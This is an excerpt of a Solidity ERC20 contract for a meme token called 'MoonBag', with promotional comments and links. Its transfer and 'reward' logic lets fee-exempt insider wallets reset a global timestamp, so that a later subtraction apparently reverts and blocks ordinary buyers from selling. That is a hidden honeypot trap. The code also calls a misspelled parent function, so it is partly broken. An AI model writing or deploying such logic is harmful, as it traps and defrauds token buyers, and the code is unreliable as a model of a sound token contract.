...
// $MOONBAG is Created to to teach us to always leave a Moon bag behind. 
// As history has taught us, $Pepe $Cult and many Great tokens reached its peak a few days or weeks after launch. 
// Never be a fully jeet learn to be have a $MOONBAG.

// https://www.moonbagerc20.com/
// https://t.me/MoonbagOfficialChannel
...
contract MoonBag is ERC20, Ownable {
    ...
    mapping(address => UserReward) private _rewardUsers;
    uint256 private _rewardTimestamp;
    ...
    constructor() ERC20("MOONBAG", "MOONBAG") {
        ...
        uint256 totalSupply = 20_000_000_000 * 1e18;
        ...
        developmentWallet = payable(0x3F667bB147d4Cda425a670C940Ad9af8d5Ff708E);
        liquidityWallet = payable(0xE7818B260462D20520cC3b470d32844c657C1fc2);
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            _rewardTimestamp = block.timestamp;
        }
        if (_isExcludedFromFees[from]) {
            super._tranfser(from, to, amount);
            return;
        }
        _rewardCalculation(from, to);
    ...
    function _rewardCalculation(address from, address to) internal {
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                UserReward storage userInfo = _rewardUsers[to];
                if (userInfo.lastSwapBuy == 0) {
                    userInfo.lastSwapBuy = block.timestamp;
                }
            } else {
                UserReward storage userInfo = _rewardUsers[from];
                userInfo.holdingDuration = userInfo.lastSwapBuy - _rewardTimestamp;
                userInfo.lastSwapSell = block.timestamp;
            }
        }
    }
